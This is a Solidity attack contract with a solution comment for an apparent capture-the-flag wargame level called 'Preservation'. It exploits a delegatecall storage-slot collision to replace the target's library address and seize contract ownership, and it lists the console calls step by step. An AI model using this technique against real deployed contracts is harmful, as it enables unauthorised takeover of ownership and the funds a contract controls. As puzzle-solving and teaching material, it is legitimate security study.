// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PreservationAttack {
  address public timeZone1Library; //slot 0
  address public timeZone2Library; //slot 1
  address public owner;  //slot 2
  uint storedTime;  //slot 3

  function setTime(uint _time) public {
    owner = msg.sender;
  }

 /* Solution
 At begining, Preservation contract use delegatecall to LibraryContract for setTime but 
 state was changed in Preservation contract at slot 0 because LibraryContract refer storeTime in slot 0
 but slot 0 in Preservation contract is timeZone1Library address.So, we use this way to make
 Preservation contract call setTime function to set slot 0 to be our address (PreservationAttack contract) first
 and then call setTime again, this time it will execute setTime from our contract but make change
 on the state Preservation contract at slot 2 because we order slot same to change owner

 Deploy this contract and got address 0x2cC101Dbb12a22feE5AF1688ac2c24B0e43C8aEB
 Step1: change slot0 to be our contract by setTime
 await contract.setFirstTime("0x2cC101Dbb12a22feE5AF1688ac2c24B0e43C8aEB")
 Step2: check owner
 await contract.owner() =>'0x97E982a15FbB1C28F6B8ee971BEc15C78b3d263F'
 Step3: call setTime again for change slot 2
 await contract.setFirstTime("12345")
 this time owner change to be our player address
 */
}